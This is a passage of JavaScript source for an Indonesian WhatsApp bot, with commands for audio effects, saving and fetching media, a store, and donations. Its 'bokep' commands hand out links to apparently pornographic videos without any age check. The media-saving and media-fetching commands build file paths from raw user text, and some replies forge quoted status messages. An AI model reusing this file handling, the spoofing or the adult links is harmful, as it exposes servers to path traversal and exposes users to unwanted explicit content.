reply(mess.wait)
goo = await getBuffer(huft.result.url)
zeroyt7.sendMessage(from, goo, image, {quoted: fstatus, caption: 'Nih Cecan🐣'})
break

//━━━━━━━━━━━━━━━[ FITUR VOKEP ]━━━━━━━━━━━━━━━━━//

case 'bokep1':				 
   qute = fs.readFileSync('thumbnail.jpg')
   zeroyt7.sendMessage(from, qute, image, { quoted: fstatus, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
   break
case 'bokep2': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   qute = fs.readFileSync('thumbnail.jpg')
   zeroyt7.sendMessage(from, qute, image, { quoted: fstatus, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })
   break
case 'bokep3': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   qute = fs.readFileSync('thumbnail.jpg')
   zeroyt7.sendMessage(from, qute, image, { quoted: fstatus, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' })				    
   break
case 'bokep4':	
   qute = fs.readFileSync('thumbnail.jpg')
   zeroyt7.sendMessage(from, qute, image, { quoted: fstatus, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })				   
   break
case 'bokep5':	
   qute = fs.readFileSync('thumbnail.jpg')
   zeroyt7.sendMessage(from, qute, image, { quoted: fstatus, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })				   
   break

//━━━━━━━━━━━━━━━[ FITUR SOUND ]━━━━━━━━━━━━━━━━━//

case 'sound1': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   zeroyt7.sendMessage(from, sound1, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: fvn})
   break                          
case 'sound2': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   zeroyt7.sendMessage(from, sound2, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: fvn})
   break 
case 'sound3': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   zeroyt7.sendMessage(from, sound3, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: fvn})
   break 
case 'sound4': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   zeroyt7.sendMessage(from, sound4, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: fvn})
   break       
case 'sound5': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   zeroyt7.sendMessage(from, sound5, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: fvn})
   break           
case 'desah': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
   zeroyt7.sendMessage(from, desahan4, audio, { mimetype: 'audio/mp4', duration: 999999999, ptt: true, quoted: fvn})
   break
case 'slow': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
zeroyt7.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: fstatus})
fs.unlinkSync(ran)
})
break
case 'fast': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
try {
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "atempo=1.3,asetrate=43000" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
zeroyt7.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
} catch (e) {
reply(mess.error.api)
}  
break
case 'robot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await zeroyt7.downloadAndSaveMediaMessage(encmedia)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
zeroyt7.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, quoted: fvn})
fs.unlinkSync(ran)
})
break
case 'addvn': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
svst = body.slice(7)
if (!svst) return reply('Nama audionya apa su?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await zeroyt7.downloadMediaMessage(boij)
audionye.push(`${svst}`)
fs.writeFileSync(`./F1/${svst}.mp3`, delb)
fs.writeFileSync('./F1/audio.json', JSON.stringify(audionye))
zeroyt7.sendMessage(from, `Sukses Menambahkan Vn ke dalam database\nSilahkann Cek dengan cara ${prefix}listvn`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg')} }} }) 
break
case 'getvn': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply('Masukan nama yang terdaftar di list vn')
namastc = body.slice(7)
buffer = fs.readFileSync(`./F1/${namastc}.mp3`)
zeroyt7.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4',  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg')} }}, ptt: true })
break
case 'listvn': 
case 'vnlist': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
teks = '*List Vn:*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*`
zeroyt7.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg')} }}, contextInfo: { "mentionedJid": audionye } })
break
case 'addimage': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (!isQuotedImage) return reply('Reply imagenya blokk!')
svst = body.slice(10)
if (!svst) return reply('Nama imagenya apa su?')
boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
delb = await zeroyt7.downloadMediaMessage(boij)
imagenye.push(`${svst}`)
fs.writeFileSync(`./F1/${svst}.jpeg`, delb)
fs.writeFileSync('./F1/images.json', JSON.stringify(imagenye))
zeroyt7.sendMessage(from, `Sukses Menambahkan image ke dalam database\nSilahkan cek dengan cara ${prefix}listimage`, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg')} }} }) 
break
case 'getimage': 
case 'getimg': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply('Masukan nama yang terdaftar di list image')
namastc = body.slice(10)
buffer = fs.readFileSync(`./F1/${namastc}.jpeg`)
zeroyt7.sendMessage(from, buffer, image, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg')} }}, caption: `Result From Database : ${namastc}.jpeg` })
break
case 'imagelist': 
case 'listimage': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
teks = '*List Image :*\n\n'
for (let awokwkwk of imagenye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagenye.length}*`
zeroyt7.sendMessage(from, teks.trim(), extendedText, {  quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "_SelfBot OnlyDev City_", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JStw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('thumbnail.jpg')} }}, contextInfo: { "mentionedJid": imagenye } })
break

//━━━━━━━━━━━━━━━[ FITUR OTHER ]━━━━━━━━━━━━━━━━━//

case 'ultah': case 'hbd': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply(`Usage : #ultah tahun-bulan-tanggal\nExample : #ultah 2004-01-12`)
if (!args[0].includes("-")) return reply(`Usage : #ultah tahun-bulan-tanggal\nExampla : #ultah 2006-01-12`)
qq = q
zodiakk = [
["Capricorn", new Date(1970, 0, 1)],
["Aquarius", new Date(1970, 0, 20)],
["Pisces", new Date(1970, 1, 19)],
["Aries", new Date(1970, 2, 21)],
["Taurus", new Date(1970, 3, 21)],
["Gemini", new Date(1970, 4, 21)],
["Cancer", new Date(1970, 5, 22)],
["Leo", new Date(1970, 6, 23)],
["Virgo", new Date(1970, 7, 23)],
["Libra", new Date(1970, 8, 23)],
["Scorpio", new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn", new Date(1970, 11, 22)]
].reverse()
function getZodiac(month, day) {
dey = new Date(1970, month - 1, day)
return zodiakk.find(([_,_d]) => dey >= _d)[0]
}
dateek = new Date(qq)
if (dateek == 'Invalid Date') throw dateek
let dd = new Date()
let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]
zodiackk = getZodiac(birth[1], birth[2])
ageD = new Date(d - dateek)
agek = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()
birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat ulang tahun yang ke-${agek} 🥳` : agek
reply(`
*Lahir : ${birth.join(', ')}*
*Ultah Mendatang : ${birthday.join(', ')}*
*Usia : ${cekusia}*
*Zodiak : ${zodiackk}*
`.trim())
break
case 'tag': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
var nomqm = `${body.slice(5)}@s.whatsapp.net`
tagq = `@${nomqm.split('@')[0]}` 
zeroyt7.sendMessage(from, tagq, text, { quoted: fstatus, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
break
case 'tagme': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
var nomqm = mek.participant
tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
zeroyt7.sendMessage(from, tagu, text, { quoted: fstatus, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
break
case 'd': 
case 'del': 
case 'delete': 
try {
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply chat bot')
zeroyt7.deleteMessage(from, {id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
   } catch (e){
reply('Reply chat bot')
}
break
case 'done': 
case 'owner': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
members_ids = []
for (let mem of groupMembers) {
members_ids.push(mem.jid)
}
vcard2 = 'BEGIN:VCARD\n'
+ 'VERSION:3.0\n'
+ `FN:${ownername}\n`
+ `ORG: Creator ${ownername} ;\n`
+ `TEL;type=CELL;type=VOICE;waid=${owner}:${owner}\n`
+ 'END:VCARD'.trim()
zeroyt7.sendMessage(from, {displayName: `Creator ${ownername}`, vcard: vcard2}, contact, 
{ quoted: fstatus, 
})
   sendButMessage (from, kon1, kon2, kon3, { quoted: mek})
   break      
break
case 'report': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
const pesan = body.slice(8)
if (pesan.length > 300) return pras.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', text, { quoted: fstatus })
var nomor = mek.participant
const teks1 = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
var options = {
text: teks1,
contextInfo: { mentionedJid: [nomor] },
}
zeroyt7.sendMessage(`62895320009580@s.whatsapp.net`, options, text, { quoted: fstatus })
reply('Masalah Telah Di Laporkan Ke Owner BOT, Mohon Tunggu Untuk Proses Perbaikan')
break
case 'nulis': 
case 'tulis': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
if (args.length < 1) return reply('Yang mau di tulis apaan?')
teks = args.join(' ')
reply(mess.wait)
nulis = encodeURIComponent(teks)
res = await axios.get(`https://dt-04.herokuapp.com/nulis?text=${nulis}`)
if (res.data.error) return reply(res.data.error)
buff = Buffer.from(res.data.result.split(',')[1], 'base64')
zeroyt7.sendMessage(from, buff, image, {quoted: fstatus, caption: mess.success}).catch(e => {
return reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim File_')
})
break
case 'botstat': 
case 'infobot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
groups = zeroyt7.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = zeroyt7.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
totalChat = await zeroyt7.chats.all()
var menu =`${bold}Bot Name : ${botname}${bold}
${bold}Owner Name : ${ownername}${bold}
${bold}Dev : ZeroYT7${bold}

${bold}Group Chats : ${groups.length}${bold}
${bold}Private Chats : ${privat.length}${bold}
${bold}Total Chats : ${totalChat.length}${bold}
${bold}Pengguna : ${_registered.length}${bold}
${bold}Hit Today : ${hit_today.length}${bold}
${bold}Hit All : ${hitall}${bold}

${bold}Platform : ${os.platform()}${bold}
${bold}Hostname : ${os.hostname()}${bold}
${bold}Wa Version: ${zeroyt7.user.phone.wa_version}${bold}
${bold}Os Version: ${zeroyt7.user.phone.os_version}${bold}
${bold}Device Manufacturer: ${zeroyt7.user.phone.device_manufacturer}${bold}
${bold}Device Model: ${zeroyt7.user.phone.device_model}${bold}
${bold}Os Build Number: ${zeroyt7.user.phone.os_build_number}${bold}`
zeroyt7.sendMessage(from, { contentText: `${menu}`, footerText: `OFFICIAL BOT BY
@${Verived.split('@')[0]}
@${zer.split("@")[0]}
@${kuz.split("@")[0]}`, 
buttons: [{ buttonId: `${prefix}menu`, buttonText: { displayText: 'Menu' }, type: 1 }], 
headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '',
jpegThumbnail: fs.readFileSync("thumbnail.jpg"), 
contextInfo: {mentionedJid: [Verived, zer, kuz, + "@s.whatsapp.net"]}}}, 'buttonsMessage')
break
 
//━━━━━━━━━━━━━━━[ STORE ]━━━━━━━━━━━━━━━━━//

case 'store': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
list = []
listmenu = [`owner`,`sc`,`sewabot`,`muridbot`]
listmenuu = [`Owner`,`Script Bot`,`Sewa Bot`,`Murid Bot`]
nombor = 1
startnum = 0
for (let x of listmenu) {
const yy = {title: 'menu ke' + nombor++,
rows: [
   {
title: `${listmenuu[startnum++]}`,
description: ``,
rowId: `${prefix}${x}`
  }
]
   }
list.push(yy)
   }
listmsg(from, `Mau Buy Apaan Kak😄`, `  `, list)
break
case 'belipremium': 
case 'buypremium': 
case 'sewabot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
gopeynya = 'https://i.ibb.co/74b0scg/017d218d9581.jpg'
buff = await getBuffer(gopeynya)
lolot = 
teksnya = `┏━━⬣ PRICE LIST 1
┃⬡ SEWA 7K/MINGGU
┃⬡ SEWA 10K/BLN
┃⬡ SEWA + PREMIUM 13k
┃⬡ PERMANEN 15k
┃⬡ PERMANEN + PREM 17k
┃⬡ ALL PERMANEN 20k
┗━━⬣

┏━━⬣ PRICE LIST 2
┃⬡ JADI BOT 10K/2 minggu
┃⬡ JADI BOT + OWNER 20k
┃⬡ PRICE BOT TANYA OWNER
┗━━⬣

┏━━⬣ MINAT? PM
┃⬡ wa.me/62895320009580
┃⬡ Ig @rimu.store
┗━━⬣`
but = but = [{ buttonId: `${prefix}gopay`, buttonText: { displayText: 'Gopay' }, type: 1 },{ buttonId: `${prefix}dana`, buttonText: { displayText: 'Dana' }, type: 1 },{ buttonId: `${prefix}allpay`, buttonText: { displayText: 'All Pay' }, type: 1 }]
ok = `idle Shinobi botz By rimu`
sendButLoc(from, lolot, ok, img, but)
break
case 'muridbot': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
katalog(`Open Murid Bot By rimu

Harga Join : 15K
Diajarin Sampe Bisa
Boleh Tanya
Cara Ganti Noowner
Dll

Pay : Gopay/Dana/Allpay

Minat?
wa.me/62895320009580 (rimu)`)
break
case 'script': 
case 'sc': 
case 'sourcecode': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
anu =`╭─❒ SCRIPT
│◦➛Base : ZeroYT7
│◦➛Recode : rimu
│
└──────[ GITHUB ]──────❒
  │◦➛Script Ory :
  │◦➛https://github.com/Zero-YT7/Base-ZeroYT7
  │◦➛Script Recode : 
  │◦➛https://github.com/KxD/NeoBot
  └──────────────────❒`
fakeyt(anu)
break

//====================>PEMBAYARAN<===================

case 'gopay': 
case 'qrgopay': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
teks = `Bantu Bot Dengan Donasi Agar Bot Update😄`
gipay = fs.readFileSync('./F4/gopay.jpg')
trans = `idle Shinobi botz By rimu😈`
but = [{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner' }, type: 1 }]
sendButImage(from, teks, trans, gipay, but)
break
case 'dana': 
case 'qrdana': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
teks = `Bantu Bot Dengan Donasi Agar Bot Update😄`
donat = fs.readFileSync('./F4/dana.jpg')
trans = `idle Shinobi botz By rimu😈`
but = [{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner' }, type: 1 }]
sendButImage(from, teks, trans, donat, but)
break
case 'allpay': 
case 'qrallpay': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
teks = `Bantu Bot Dengan Donasi Agar Bot Update😄`
qrall = fs.readFileSync('./F4/allpay.jpg')
trans = `idle Shinobi botz By rimu😈`
but = [{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Owner' }, type: 1 }]
sendButImage(from, teks, trans, qrall, but)
break

//━━━━━━━━━━━━━━━[ REPLY ]━━━━━━━━━━━━━━━━━//
  case 'waktu': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  reply(`《Waktu Menuju》
${newYear}
${Ramadhan}

《Waktu Indonesia》
Date : ${date}
Wib : ${Wib}
Wita : ${Wita}
Wit : ${Wit}`)
break

  case 'readmore': 
if (isBanned) return reply(mess.Ban) 
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fstatus})
  reply('‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎